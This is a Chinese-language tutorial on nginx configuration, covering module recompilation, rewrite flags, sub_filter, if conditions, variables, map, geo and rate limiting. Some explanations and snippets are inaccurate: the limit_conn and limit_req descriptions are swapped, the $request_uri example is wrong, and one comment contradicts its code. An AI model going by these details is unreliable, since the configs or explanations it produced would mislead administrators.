 --with-http_image_filter_module \
 --add-module=../ngx_pagespeed-master
# make
# /usr/local/nginx-1.4.1/sbin/nginx -s stop
# cp objs/nginx /usr/local/nginx/sbin/nginx
# /usr/local/nginx-1.4.1/sbin/nginx

安装nginx安装第三方模块实际上是使用--add-module重新安装一次nginx,不要make install而是直接把编译目录下objs/nginx文件直接覆盖老的nginx文件.如果需要安装多个nginx第三方模块,只需要多指定几个相应的--add-module即可
重新编译的时候,记得一定要把以前编译过的模块一同加到configure参数里面

nginx提供了非常多的nginx第三方模块提供安装,地址https://www.nginx.com/resources/wiki/modules/

</pre>
</div>

<div id="nginx_rewrite">
<h4>nginx配置url重写rewrite 重写URI请求</h4><pre>
ngx_http_rewrite_module模块将请求的url基于正则表达式进行重写(URL重定向),在如下情况下可以使用：ttp转换成httpd服务http -> https、域名转换domain1.tld -> domain2.tld,、URL转换uri1 --> uri2、实现SEO搜索引擎优化效果等

url重写是指通过配置conf文件,让网站的url中达到某种状态时定向/跳转到某个规则,比如常见的伪静态、301重定向、浏览器定向等

nginx的重写模块ngx_http_rewrite_module是一个简单的正则表达式匹配与一个虚拟堆叠机结合。依赖于PCRE库,因此需要安装pcre
根据相关变量重定向和选择不同的配置,从一个location跳转到另一个location,不过这样的循环最多可以执行10次,超过后nginx将返回500错误
重写模块包含set指令来创建新的变量并设其值,这在有些情景下非常有用的,如记录条件标识、传递参数到其他location、记录做了什么等

可以通过使用rewrite指令在请求处理期间多次修改请求URI
可以在location和server上下文中包含多个rewrite指令,NGINX按照它们发生的顺序逐个执行指令。当选择该上下文时server上下文中的rewrite指令将被执行一次。
在NGINX处理一组rewrite指令之后,它根据新的URI选择一个location上下文。如果所选location块包含rewrite指令,则依次执行它们。如果URI与其中任何一个匹配,则在处理所有定义的rewrite指令之后,将搜索新location块

rewrite指令
Syntax: rewrite regex replacement [flag];
Default: —
Context: server,location,if
按照相关的正则表达式与字符串修改URI,指令按照在配置文件中出现的顺序执行
如果替换的字符串以http://开头,请求将被重定向,并且不再执行多余的rewrite指令。

regex：正则表达式,用于匹配用户请求的url
可以使用括号来捕获,后续可以根据位置来将其引用,位置变量值取决于捕获正则表达式中的顺序,$1引用第一个括号中的值,$2引用第二个括号中的值,以此类推
^/images/([a-z]{2})/([a-z0-9]{5})/(.*)\.(png|jpg|gif)$

replacement：重写(重定向、替换)成为的结果URI,表示匹配到规则后要定向的路径,该URI可能包含正则表达式中的捕获的位置参数或这个级别下的nginx任何配置变量,如/data?file=$3.$4

尾部的标记(flag)可能值：
last
重写完成之后停止对当前uri的进一步处理,重新请求URL,对新url的新一轮从第一条开始匹配处理;
可能会出现死循环情况,此时可以设置循环次数,超过次数后返回给客户端错误
停止处理重写模块指令,之后搜索location与更改后的URI匹配;相当于Apache里的(L)标记,表示完成rewrite,浏览器地址栏URL地址不变
break
重写完成之后停止对当uri的处理,重写检查结果结束,转向其后面的其它配置;
完成重写指令,本条规则匹配完成后终止匹配,不再匹配后面的规则,浏览器地址栏URL地址不变
redirect
重写完成后返回客户端一个临时的重定向,由客户端对新的url重新发起请求(302);浏览器地址会显示跳转后的URL地址,如果替换字段用http://开头则被使用
permanent
重写完成后返回客户端一个永久的重定向,由客户端对新的url重新发起请求(301);浏览器地址栏会显示跳转后的URL地址

last和break请求处理是在服务器内部完成,客户端仅请求一次。redirect和permanent需要客户端再次请求

last和break的区别
last一般写在server和if中,而break一般使用在location中
last不终止重写后的url匹配,即新的url会再从server走一遍匹配流程,而break终止重写后的匹配
break和last都能组织继续执行后面的rewrite指令
在location里一旦返回break则直接生效并停止后续的匹配location

last标记将导致重写后的URI搜索匹配nginx的其他location,最多可循环10次
rewrite '^/images/([a-z]{2})/([a-z0-9]{5})/(.*)\.(png|jpg|gif)$' /data?file=$3.$4 last;
break指令可以当做自身指令
if ($bwhog) {
  limit_rate 300k;
  break;
}

另一个停止重写模块处理指令是return,用来控制主HTTP模块处理请求。 这意味着nginx直接返回信息给客户端,与error_page结合为客户端呈现格式化的HTML页面或激活不同的模块来完成请求。如果状态码附带文字段落,该文本将被放置在响应主体。相反如果状态码后面是一个URL,该URL将成为location头补值。没有状态码的URL将被视为一个302状态码。如：
location = /image404.html {
  return 404 "image not found\n";
}

rewrite_log
语法：rewrite_log on | off
默认值：rewrite_log off
使用字段：server,location,if
变量：无
启用时将在error log中记录notice级别的重写日志。

</pre><textarea>server {
  # url重写,请求/123456/xxxx变为/xxxx?id=123456
  location /{
    rewrite ^(.*)/equip(d+).html$ $1/index.php?m=content&c=index&a=lists&catid=$2 last;
  }

  # 访问/last.html时页面内容重写到/index.html中
  rewrite /last.html /index.html last;

  # 访问/break.html 的时候,页面内容重写到/index.html中,并停止后续的匹配
  rewrite /break.html /index.html break;

  # 访问/redirect.html时页面直接302定向到/index.html中
  rewrite /redirect.html /index.html redirect;

  # 访问/permanent.html时页面直接301定向到/index.html中
  rewrite /permanent.html /index.html permanent;

  # 把 /html/*.html => /post/*.html ,301定向
  rewrite ^/html/(.+?).html$ /post/$1.html permanent;

  # 把 /search/key => /search.html?keyword=key
  rewrite ^/search\/([^\/]+?)(\/|$) /search.html?keyword=$1 permanent;
}

</textarea>假地址掩饰真地址<textarea>server {
  # 用xxoo_admin来掩饰admin
  location / {
    # 使用break拿一旦匹配成功则忽略后续location
    rewrite /xxoo_admin /admin break;
  }
  # 访问真实地址直接报没权限
  location /admin {
    return 403;
  }
}

</textarea><textarea>// 访问/last/时重写到/q.html,然后使用新的uri再匹配,正好匹配到locatoin = /q.html然后返回了400
// 访问/break时重写到/q.html,由于返回了break,则直接停止了

server {
  location / {
    rewrite /last/ /q.html last;
    rewrite /break/ /q.html break;
  }
  location = /q.html {
    return 400;
  }
}

</textarea>显示了与return返回指令相结合的rewrite指令<textarea>// 配置区分两组URI,诸如/download/some/media/file之类的URI更改为/download/some/mp3/file.mp3。由于最后一个标志,所以跳过后续指令(第二次rewrite和return指令),但NGINX继续处理该请求,该请求现在具有不同的URI。
// 类似地,诸如/download/some/audio/file的URI被替换为/download/some/mp3/file.ra。
// 如果URI与rewrite指令不匹配,则NGINX将403错误代码返回给客户端。
server {
  rewrite ^(/download/.*)/media/(.*)\..*$ $1/mp3/$2.mp3 last;
  rewrite ^(/download/.*)/audio/(.*)\..*$ $1/mp3/$2.ra  last;
  return  403;
}

</textarea><textarea>http {
  # 定义image日志格式
  log_format imagelog '[$time_local] ' $image_file ' ' $image_type ' ' $body_bytes_sent ' ' $status;
  # 开启重写日志
  rewrite_log on;

  server {
    root /home/www;

    location / {
      # 重写规则信息
      error_log logs/rewrite.log notice;
      # 这条规则后面加上"last"参数,否则下面的set指令不会执行
      rewrite '^/images/([a-z]{2})/([a-z0-9]{5})/(.*)\.(png|jpg|gif)$' /data?file=$3.$4;
      set $image_file $3;
      set $image_type $4;
    }

    location /data {
      access_log logs/images.log mian;  # 指定针对图片的日志格式,来分析图片类型和大小
      root /data/images;
      # 应用前面定义的变量。判断首先文件在不在,不在再判断目录在不在,如果还不在就跳转到最后一个url里
      try_files /$arg_file /image404.html;
    }
    location = /image404.html {
      return 404 "image not found\n";   # 图片不存在返回特定的信息
    }
}

</textarea>

<h4>sub_filter指令修改响应内容</h4><pre>
ngx_http_sub_module模块是一个过滤器,修改网站响应内容中的字符串,将一个字符串替换为另一个字符串,可以使用sub_filter指令来定义要应用的重写,该指令支持变量和替代链,使更复杂的更改成为可能

这个模块已内置在nginx,但默认未安装,需要安装需要加上配置参数：--with-http_sub_module
# wget http://nginx.org/download/nginx-1.4.2.tar.gz
# tar -xzvf nginx-1.4.2.tar.gz
# cd nginx-1.4.2
#  --prefix=/usr/local/nginx-1.4.2 --with-http_stub_status_module　--with-http_sub_module
# make
# make install

指令(Directives)
语法:     sub_filter string replacement;
默认值:   —
配置段:   http,server,location
设置需要使用replacement字符串替换string字符串,string是要被替换的字符串,replacement是新的字符串,它里面可以带变量。替换是不区分大小写的

语法:     sub_filter_last_modified on | off;
默认值:   sub_filter_last_modified off;
配置段:   http,server,location
Allows preserving the "Last-Modified" header field from the original response during replacement to facilitate response caching.
By default,the header field is removed as contents of the response are modified during processing.

语法:   sub_filter_once on | off;
默认值: sub_filter_once on;
配置段: http,server,location
字符串替换一次还是多次替换,默认替换一次,例如要替换响应内容中的ttlsa为运维生存时间,如果有多个ttlsa出现只会替换第一个,否则所有的ttlsa都会被替换

语法:   sub_filter_types mime-type ...;
默认值: sub_filter_types text/html;
配置段: http,server,location
指定需要被替换的MIME类型,默认"text/html",*表示所有的

</pre><textarea># 替换网站响应内容
location / {
  root html;
  index index.html index.htm;
  sub_filter codingfarmer "这是替换的内容";
  sub_filter_types text/html;
  sub_filter_once off;
}

# 更改引用除代理服务器之外的绝对链接：
location / {
  sub_filter  /blog/ /blog-staging/;
  sub_filter_once off;
}

location / {
  sub_filter  'href="http://127.0.0.1:8080/' 'href="http://$host/';
  sub_filter  'img src="http://127.0.0.1:8080/' 'img src="http://$host/';
  sub_filter_once on;
}

# 在head标签后追加一段js
location / {
  sub_filter ＜/head＞ '＜/head＞＜script language="javascript" src="$script"＞＜/script＞';
  sub_filter_once on;
}

</textarea>
</div>

<div id="nginx_if">
<h4>if判断</h4><pre>
简单重写很多时候满足不了需求,需要判断当文件不存在时、当路径包含xx时等条件则需要用到if,尽量考虑使用trp_files代替

if (condition表达式) { ... }
使用字段：server,location

当if表达式只是一个变量时,如果值为空或任何以0开头的字符串都会当做false
直接比较变量和内容时,使用=或!=
~正则表达式匹配,~*不区分大小写的匹配,!~区分大小写的不匹配

内置的条件判断：
-f和!-f用来判断是否存在文件
-d和!-d用来判断是否存在目录
-e和!-e用来判断是否存在文件或目录或符号链接
-x和!-x用来判断文件是否可执行

</pre><textarea># 如果文件不存在则返回400
if (!-f $request_filename) {
  return 400;
}

# 如果host不是xuexb.com则301到xuexb.com
if ( $host != "xuexb.com" ){
  rewrite ^/(.*)$ https://xuexb.com/$1 permanent;
}

# 如果请求类型不是POST则返回405
if ($request_method = POST) {
  return 405;
}

# 如果参数中有a=1则301到指定域名
if ($args ~ a=1) {
  rewrite ^ http://example.com/ permanent;
}

# cookie首部检测匹配
if($http_cookie ~* "id=([^;]+)(?:;|$)") {
  set $id $1;
}

# 限速(如会员认为不是slow不做限速)
if($slow) {
  limit_rate 10k;
}

# 非法引用,返回403,也可以对非法引用到其他网页
if($invalid_referer) {
  return 403;
}

</textarea>在某种场景下可结合location规则来使用<textarea># 访问/test.html
location = /test.html {
  # 默认值为xiaowu
  set $name xiaowu;

  # 如果参数中有 name=xx 则使用该值
  if ($args ~* name=(\w+?)(&|$)) {
    set $name $1;
  }

  # 301
  rewrite ^ /$name.html permanent;
}

上面表示：
/test.html => /xiaowu.html
/test.html?name=ok => /ok.html?name=ok

</textarea><textarea>// 网站域名从http到https的转移测试阶段,局域网访问时强制访问加密的https服务,外部用户访问正常的http服务
// $remote_addr为获取客户端访问地址,如果网站使用了前端代理或负载均衡的话使用$http_x_forwarded_for

if($http_x_forwarded_for ~ ^106\.38\.53\.130|210\.12\.103\.18){
  return 301 https://www.xxx.cn$request_uri;
}

#用变量的方式来间接实现
set $flag 0;

if($http_x_forwarded_for ~ ^106\.38\.53\.130|210\.12\.103\.18){
  set $flag "${flag}1";
}

if($flag = "01"){
  return 301 https://www.xxx.cn$request_uri;
}

</textarea>Nginx区分PC或手机访问不同网站<textarea>location / {
  proxy_pass http://10.10.100.60:8183;
  if ( $http_user_agent ~* "(mobile|nokia|iPhone|ipad|android|samsung|htc|blackberry)" ){
    rewrite  ^/$    http://www.baidu.com;
  }
  index index.html index.htm;
}

</textarea>作为nginx的停服更新使用,仅允许222.222.222.222或内网的两个IP访问,其他IP都rewrite到停服页面<textarea>set $my_ip '';
if ( $remote_addr = 222.222.222.222){set $my_ip 1;} #用了负载均衡的话,这里应该是$http_x_forwarded_for
if ( $remote_addr = 192.168.1.170 ){ set $my_ip 1;}
if ( $remote_addr = 192.168.1.169 ){ set $my_ip 1;}
if ( $my_ip != 1) {rewrite ^/design/(.*)\.php$ /tingfu.html?$1&;}  #将*.php转到tingfu.html

</textarea><pre>
【 nginx逻辑运算 】
nginx的配置中不支持if条件的逻辑与&&逻辑或||运算,而且不支持if的嵌套语法,否则会报错：nginx: [emerg] invalid condition。
可以用变量的方式来间接实现。

</pre><textarea>报错：
if ($arg_unitid = 42012 && $uri ~/thumb/){
  echo "www.ttlsa.com";
}

改成：
set $flag 0;
if ($uri ~ ^/thumb/[0-9]+_160.jpg$){
  set $flag "${flag}1";
}
if ($arg_unitid = 42012){
  set $flag "${flag}1";
}
if ($flag = "011"){
  echo "www.ttlsa.com";
}

</textarea><textarea>// 访问/cms/index.php,且ip地址不是106.38.53.130的跳转到https://www.xxoo.cn

set $ssl_80 '';
if($request_uri ~* /cms/index.php){                    //客户端请求的完整请求路径
  set $ssl_80 A;
}

if($http_x_forwarded_for !~* ^106\.38\.53\.130.*){     //前端有负载均衡的客户端ip地址
  set $ssl_80 "${ssl_80}B";
}

#if($remote_addr !~* ^10\.105\.99\.158.*){             //客户端ip地址
#  set $ssl_80 "${ssl_80}C";
#}

if($ssl_80 = AB){
  #return 403;
  rewrite ^(.*)$ https://www.xxoo.cn permanent;
}

</textarea>
</div>

<div id="nginx_var">
<h4>nginx的变量</h4><pre>
set
语法：set variable value
默认值：none
使用字段：server,location,if
为给定的变量设置一个特定值。

uninitialized_variable_warn
语法：uninitialized_variable_warn on|off
默认值：uninitialized_variable_warn on
使用字段：http,server,location,if
控制是否记录未初始化变量的警告信息。

Nginx配置中变量只能存放字符串类型的值
所有的Nginx变量在Nginx配置文件中引用时都须带上$前缀,可以直接把变量嵌入到字符串常量中以构造出新的字符串
set $a hello;
set $b "$a,$a";

Ngx_http_core_module模块支持内置变量,和apache的内置变量名字一致,这些变量代表客户端请求头的内容

nginx规范化就是先将URI中形如"%XX"的编码字符进行解码,再解析URI中的相对路径"."和".."部分,还可能会压缩相邻的两个或多个斜线成为一个斜线

</pre><textarea>访问链接是：http://localhost:88/test1/test2/test.php
网站路径是：/var/www/html
$host：localhost
$server_port：88
$request_uri：http://localhost:88/test1/test2/test.php
$document_uri：/test1/test2/test.php
$document_root：/var/www/html
$request_filename：/var/www/html/test1/test2/test.php

</textarea><pre>
【 常见变量 】
$is_args
如果请求中有参数则值为"?",否则为空字符串

$query_string
请求URI中的参数,与$args相同,然而$query_string是只读的不会改变

$args
请求中的完整参数,等于请求行中的参数,同$query_string
如请求/index.php?width=400&height=200中$args表示width=400&height=200

$arg_name
表示HTTP请求中某个参数的值,如/index.php?site=www.ttlsa.com可用$arg_site取得www.ttlsa.com这个值

$body_bytes_sent
向客户端发送的http响应中包体部分的字节数,响应头不计算在内;这个变量和Apache的mod_log_config模块%B参数兼容

$bytes_sent
传输给客户端的字节数

$connection
TCP连接的序列号

$connection_requests
TCP连接当前的请求数量

$content_length
表示客户端请求头部中的Content-Length字段

$content_type
表示客户端请求头部中的Content-Type字段

$http_user_agent
客户端agent信息

$http_cookie
客户端cookie信息

$cookie_COOKIE
表示在客户端请求头部中的cookie字段

$realpath_root
当前请求的文档根目录或别名的真实路径,会将所有符号连接转换为真实路径。

$document_root
当前请求的文档根目录或别名,当前请求在root指令中指定的值

$document_uri
同$uri

$host
表示客户端请求头部中的Host字段。如果Host字段不存在则以实际处理的server(虚拟主机)名称代替。如果Host字段中带有端口,如IP:PORT,那么$host是去掉端口的,它的值为IP。$host 是全小写的。这些特性与http_HEADER中的http_host不同,http_host只取出Host头部对应的值。

$hostname
表示Nginx所在机器的名称,主机名,与gethostbyname调用返回的值相同

$http_name
匹配任意请求头字段;变量名中的后半部分"name"可以替换成任意请求头字段的小写,如在配置文件中需要获取http请求头："Accept-Language",将－替换为下划线,大写字母替换为小写,即$http_accept_language。例如请求中Host头部对应的值用$http_host表示

$https
如果开启了SSL安全模式则值为"on",否则为空字符串。

$limit_rate
用于设置响应的速度限制,表示当前连接的限速是多少,0表示无限速

$msec
当前的Unix时间戳 (1.3.9,1.2.6)

$nginx_version
当前Nginx的版本号

$pid
工作进程的PID

$pipe
如果请求来自管道通信则值为"p",否则为"."

$http_x_forwarded_for
使用代理时web服务器不知道客户端真实IP,为了避免这个情况,代理服务器通常会增加一个叫做x_forwarded_for的头信息,把连接它的客户端IP即上网机器IP加到这个头信息里,这样就能保证网站的web服务器能获取到真实IP

$proxy_protocol_addr
获取代理访问服务器的客户端地址,如果是直接访问则该值为空字符串

$binary_remote_addr
客户端地址的二进制形式,固定长度为4个字节,例如：\x0A\xE0B\x0E

$remote_addr
客户端的IP,但它的值不是由客户端提供的,而是服务端根据客户端的ip指定的,浏览器访问某个网站时,假设中间没有任何代理,那么网站的web服务器(Nginx,Apache等)就会把remote_addr设为机器IP,如果用了某个代理,那么浏览器会先访问这个代理,然后再由这个代理转发到网站,这样web服务器就会把remote_addr设为这台代理机器的IP

$remote_port
客户端端口

$remote_user
用于HTTP基础认证服务的用户名,已经经过Auth Basic Module验证的用户名

$request
代表客户端的请求地址

$request_body
客户端HTTP请求中的请求主体;此变量可在location中使用,该参数只在proxy_pass或fastcgi_pass中有意义,将请求主体通过proxy_pass,fastcgi_pass,uwsgi_pass和scgi_pass传递给下一级的代理服务器。

$request_body_file
将客户端请求主体保存在临时文件中,表示HTTP请求中的包体存储的临时文件名。文件处理结束后此文件需删除。开启此功能需要设置client_body_in_file_only。如果将此文件传递给后端的代理服务器需要禁用request body,即设置proxy_pass_request_body off,fastcgi_pass_request_body off,uwsgi_pass_request_body off,or scgi_pass_request_body off 。

$request_completion
当请求已经全部完成时其值为"ok"。若没有完成就要返回客户端则其值为空字符串;或者在断点续传等情况下使用HTTP range访问的并不是文件的最后一块,那么其值也是空字符串。

$request_filename
当前连接请求的文件路径,表示用户请求中的URI经过root或alias转换后的文件路径,由root或alias指令与URI请求生成。

$request_length
请求的长度,包括请求的地址、http请求头和请求主体

$request_method
HTTP请求方法,通常为GET或POST

$request_time
处理客户端请求使用的时间,从读取客户端的第一个字节开始计时。

$request_uri
不包含主机名包含客户端请求完整参数的原始URI如："/cnphp/test.php?arg=freemouse"
$uri和$document_uri未必是用户的原始请求,内部重定向后可能是重定向后的URI,$request_uri永远不会改变,始终是客户端的原始URI

$uri
请求中不包含主机名的当前URI,不带请求参数,可以不同于浏览器传递的$request_uri的值,它可以通过内部重定向或使用index指令进行修改,如"/foo/bar.html"。

$scheme
请求使用的Web协议,http或https

$sent_http_name
可以设置任意http响应头字段; 变量名中的后name可替换成任意响应头字段,name名称全小写,如需设置响应头Content-length,那么将－替换为下划线,大写字母替换为小写,即$sent_http_content_length 4096。例如用$sent_ http_content_type表示响应中Content-Type头部对应的值

$server_addr
服务器端地址,为了避免访问linux系统内核,应将ip地址提前设置在配置文件中。

$server_name
服务器名,www.cnphp.info

$server_port
服务器端口,请求到达服务器的端口号

$server_protocol
表示服务器向客户端发送响应的协议,如 HTTP/1.1或 HTTP/1.0

$status
HTTP响应代码

$tcpinfo_rtt,$tcpinfo_rttvar,$tcpinfo_snd_cwnd,$tcpinfo_rcv_space
客户端TCP连接的具体信息

$time_iso8601
服务器时间的ISO 8610格式

$time_local
服务器时间(LOG Format格式)

</pre>

<h4>map指令</h4><pre>
map指令使用ngx_http_map_module模块提供的,默认nginx有加载这个模块,除非人为的--without-http_map_module。
ngx_http_map_module模块可以创建变量,这些变量的值与另外的变量值相关联。允许分类或同时映射多个值到多个不同值并储存到一个变量中
map指令用来创建变量,但仅在变量被接受的时候执行视图映射操作,对于处理没有引用变量的请求时,这个模块并没有性能上的缺失。

语法: map $var1 $var2 { ... }
默认值: —
配置段: http
map为一个变量设置的映射表。映射表由两列组成,匹配模式和对应的值。
在map块里的参数指定了源变量值和结果值的对应关系。
匹配模式可以是一个简单的字符串或正则表达式,使用正则表达式要用('~'),表示这个正则表达式对大小写敏感,以~*开头表示对大小写不敏感。

</pre><textarea>map $http_user_agent $agent {
  default "";
  ~curl curl;
  ~*apachebench" ab;
}

# 正则表达式里可以包含命名捕获和位置捕获,这些变量可以跟结果变量一起被其它指令使用。
# 不能在map块里面引用命名捕获或位置捕获变量,如~^/ttlsa_com/(.*) /boy/$1; 这样会报错nginx: [emerg] unknown  variable。
map $uri $value {
  /ttlsa_com                   /index.php;
  ~^/ttlsa_com/(?＜suffix＞.*)$  /boy/;
  ~/fz(/.*)                    /index.php?;
}

# 如果源变量值包含特殊字符如'~',则要以'\'来转义。
map $http_referer $value {
  Mozilla    111;
  \~Mozilla  222;
}

# 结果变量可以是一个字符串,也可以是另外一个变量。
map $num $limit {
  1 $binary_remote_addr;
  0 "";
}

</textarea><pre>
map指令有三个参数：
default: 指定如果没有匹配结果将使用的默认值。当没有设置default,将会用一个空的字符串作为默认的结果。
hostnames: 允许用前缀或后缀掩码指定域名作为源变量值,这个参数必须写在值映射列表的最前面。
include: 包含一个或多个含有映射值的文件。

如果匹配到多个特定的变量,如掩码和正则同时匹配,那么会按照下面的顺序进行选择：
1. 没有掩码的字符串
2. 最长的带前缀的字符串,例如: "*.example.com"
3. 最长的带后缀的字符串,例如："mail.*"
4. 按顺序第一个先匹配的正则表达式 (在配置文件中体现的顺序)
5. 默认值

map_hash_bucket_size
语法: map_hash_bucket_size size;
默认值: map_hash_bucket_size 32|64|128;
配置段: http
指定一个映射表中的变量在哈希表中的最大值,这个值取决于处理器的缓存。

map_hash_max_size
语法: map_hash_max_size size;
默认值: map_hash_max_size 2048;
配置段: http
设置映射表对应的哈希表的最大值。

<pre>实例<textarea>http {
  map $http_user_agent $agent {
    ~curl curl;
    ~*chrome chrome;
  }
  server {
    listen       8080;
    server_name  test.ttlsa.com;

    location /hello {
      default_type text/plain;
      echo http_user_agent: $http_user_agent;
      echo agent: agent:$agent;
    }
  }
}

# curl 127.0.0.1:8080/hello
http_user_agent: curl/7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5
agent: curl

http {
  map $uri $match {
    ~^/hello/(.*) http://www.ttlsa.com/;
  }
  server {
    listen       8080;
    server_name  test.ttlsa.com;

    location /hello {
      default_type text/plain;
      echo uri: $uri;
      echo match: $match;
      echo capture: $1;
      echo new: $match$1;
    }
  }
}

</textarea>

<h4>geo指令 根据IP对变量进行赋值</h4><pre>
geo指令使用ngx_http_geo_module模块提供的。默认nginx有加载这个模块,除非人为的--without-http_geo_module。
ngx_http_geo_module模块可以用来创建变量,其值依赖于客户端IP地址。

geo指令主要是根据IP对变量进行赋值的,因此geo块下只能定义IP或网络段,否则会报错"nginx: [emerg] invalid network"

IP地址192.168.1.1/24中的/24是指子网掩码的位数,写的是多少就代表有几个1,其它位数全为0,24就代表有24个1和8个0,因为一共是32位。
子网掩码是一个32位地址,对于A类地址来说默认的子网掩码是255.0.0.0;B类地址是255.255.0.0;C类地址是255.255.255.0
8位数为一组,就可以写成：11111111 11111111 11111111 00000000 转换成十进制就是255.255.255.0。

geo指令
语法: geo [$address] $variable { ... }
默认值: —
配置段: http
定义从指定的变量获取客户端的IP地址,默认nginx从$remote_addr变量取得客户端IP地址,但也可以从其他变量获得

<pre><textarea>geo $remote_addr $geo {
  default 0;
  127.0.0.1 1;
}
geo $arg_ttlsa_com $geo {
  default 0;
  127.0.0.1 1;
}

</textarea><pre>
如果该变量的值不能代表一个合法的IP地址,那么nginx将使用地址"255.255.255.255"。
nginx通过CIDR或地址段来描述地址,支持下面几个参数：
delete：删除指定的网络
default：如果客户端地址不能匹配任意一个定义的地址,nginx将使用此值。如果使用CIDR,可以用"0.0.0.0/0"代替default。
include： 包含一个定义地址和值的文件,可以包含多个。
proxy：定义可信地址。如果请求来自可信地址,nginx将使用其"X-Forwarded-For"头来获得地址。相对于普通地址,可信地址是顺序检测的
proxy_recursive：开启递归查找地址。如果关闭递归查找,在客户端地址与某个可信地址匹配时,nginx将使用"X-Forwarded-For"中的最后一个地址来代替原始客户端地址。如果开启递归查找,在客户端地址与某个可信地址匹配时,nginx将使用"X-Forwarded-For"中最后一个与所有可信地址都不匹配的地址来代替原始客户端地址。
ranges：使用以地址段的形式定义地址,这个参数必须放在首位。为了加速装载地址库,地址应按升序定义。

<pre><textarea>geo $country {
  default        ZZ;
  include        conf/geo.conf;
  delete         127.0.0.0/16;
  proxy          192.168.100.0/24;
  proxy          2001:0db8::/32;

  127.0.0.0/24   US;
  127.0.0.1/32   RU;
  10.1.0.0/16    RU;
  192.168.1.0/24 UK;
}

vim conf/geo.conf
10.2.0.0/16    RU;
192.168.2.0/24 RU;

地址段例子：
geo $country {
  ranges;
  default                   ZZ;
  127.0.0.0-127.0.0.0       US;
  127.0.0.1-127.0.0.1       RU;
  127.0.0.1-127.0.0.255     US;
  10.1.0.0-10.1.255.255     RU;
  192.168.1.0-192.168.1.255 UK;
}

<pre>遵循最精确匹配原则,即nginx使用能最精确匹配客户端地址的值,适用实例<textarea>
1. 使用默认变量即$remote_addr
http {
  #geo $remote_addr $ttlsa_com {
  geo $ttlsa_com {
    default 0;
    127.0.0.1 1;
  }
  server {
    listen       8080;
    server_name  test.ttlsa.com;

    location /hello {
      default_type text/plain;
      echo $ttlsa_com;
      echo $arg_boy;
    }
  }
}

# curl 127.0.0.1:8080/hello?boy=默北
1
默北

2. 使用指定变量
http {
  geo $arg_boy $ttlsa_com {
    default 0;
    127.0.0.1 1;
    8.8.8.8 2;
  }
  server {
    listen       8080;
    server_name  test.ttlsa.com;

    location /hello {
      default_type text/plain;
      echo $ttlsa_com;
      echo $arg_boy;
    }
  }
}
# curl 127.0.0.1:8080/hello?boy=8.8.8.8
2
8.8.8.8

3. 匹配原则
http {
  geo $arg_boy $ttlsa_com {
    default 0;
    127.0.0.1/24 24;
    127.0.0.1/32 32;
    8.8.8.8 2;
  }
  server {
    listen       8080;
    server_name  test.ttlsa.com;

    location /hello {
      default_type text/plain;
      echo $ttlsa_com;
      echo $arg_boy;
    }
  }
}

# curl 127.0.0.1:8080/hello?boy=127.0.0.1
32
127.0.0.1
# curl 127.0.0.1:8080/hello?boy=127.0.0.12
24
127.0.0.12

</textarea>
</div>

<div id="nginx_limit">
<h3>nginx限速限流模块：限制并发和IP访问频率</h3><pre>
并发量极大的情况下,必要限流措施还是需要的,Nginx 的有对应的模块插件可通过简单配置来完成这个功能

限流算法之令牌桶算法思想
令牌以固定速率产生,并缓存到令牌桶中;
令牌桶放满时,多余的令牌被丢弃;
请求要消耗等比例的令牌才能被处理;
令牌不够时,请求被缓存。

限流算法之漏桶算法思想
水(请求)从上方倒入水桶,从水桶下方流出(被处理);
来不及流出的水存在水桶中(缓冲),以固定速率流出;
水桶满后水溢出(丢弃)。

这个算法的核心是缓存请求、匀速处理、多余的请求直接丢弃。
相比漏桶算法,令牌桶算法不同之处在于它不但有一只"桶",还有个队列,这个桶是用来存放令牌的,队列才是用来存放请求的。

从作用上来说,漏桶和令牌桶算法最明显的区别就是是否允许突发流量(burst)的处理,漏桶算法能够强行限制数据的实时传输(处理)速率,对突发流量不做额外处理;而令牌桶算法能够在限制数据的平均传输速率的同时允许某种程度的突发传输。

Nginx按请求速率限速模块使用的是漏桶算法,即能够强行保证请求的实时处理速度不会超过设置的阈值。

Nginx官方版本限制IP的连接和并发分别有两个模块：
nginx限制连接数ngx_http_limit_conn_module模块,限制单位时间内的请求数,即速率限制,采用的漏桶算法"leaky bucket"
nginx限制请求数ngx_http_limit_req_module模块,限制同一时间连接数,即并发限制

【 limit_req_zone参数配置 】
限制IP访问频率: 限制同一个ip在一段时间里连接服务器的次数,可以一定程度上防止类似CC这种快速频率请求的攻击。

Syntax:     limit_req zone=name [burst=number] [nodelay];
Default:    —
Context:    http,server,location

limit_req_zone $binary_remote_addr zone=one:10m rate=1r/s;
参数$binary_remote_addr表示通过remote_addr这个标识来做限制,"binary_"的目的是缩写内存占用量,是限制同一客户端ip地址。
参数zone=one:10m表示生成一个名为one大小为10M的内存区域存储session,用来存储访问的频次信息。
参数rate=1r/s表示允许相同标识的客户端的访问频次,这里限制的是每秒1次,1M能存储16000个状态,rete的值必须为整数,30r/m限制两秒钟一个请求

limit_req zone=one burst=5 nodelay;
参数zone=one 设置使用哪个配置区域来做限制,与上面limit_req_zone里的name对应。
参数burst=5,burst爆发,当有大量请求爆发过来时超过访问频次限制的请求可以先放到一个大小为5的缓冲区内。
参数nodelay表示超过访问频次而且缓冲区也满了的时候就会直接返回503,没有设置则所有请求会等待排队。

burst缓存处理
短时间内发送了大量请求,Nginx按照毫秒级精度统计,超出限制的请求直接拒绝。这在实际场景中未免过于苛刻,真实网络环境中请求到来不是匀速的,很可能有请求突发的情况。Nginx考虑到了这种情况,可以通过burst关键字开启对突发请求的缓存处理,而不是直接拒绝。
burst的作用是让多余的请求可以先放到队列里,慢慢处理。如果不加nodelay参数,队列里的请求不会立即处理,而是按照rate设置的速度,以毫秒级精确的速度慢慢处理。

nodelay降低排队时间
通过设置burst参数可以允许Nginx缓存处理一定程度的突发,多余的请求可以先放到队列里慢慢处理,这起到了平滑流量的作用。但如果队列设置的比较大,请求排队的时间就会比较长,用户角度看来就是RT变长了,这对用户很不友好。
解决办法:nodelay参数允许请求在排队的时候就立即被处理,也就是说只要请求能够进入burst队列就会立即被后台worker处理,这意味着burst设置了nodelay时,系统瞬间的QPS可能会超过rate设置的阈值。nodelay参数要跟burst一起使用才有作用。

Syntax: limit_req_log_level info | notice | warn | error;
Default:
limit_req_log_level error;
Context: http,server,location
当服务器由于limit被限速或缓存时配置写入日志,延迟的记录比拒绝的记录低一个级别,例如limit_req_log_level notice延迟的的基本是info。

Syntax: limit_req_status code;
Default:
limit_req_status 503;
Context:    http,server,location
设置拒绝请求的返回值,值只能设置400到599之间

<pre><textarea>http {
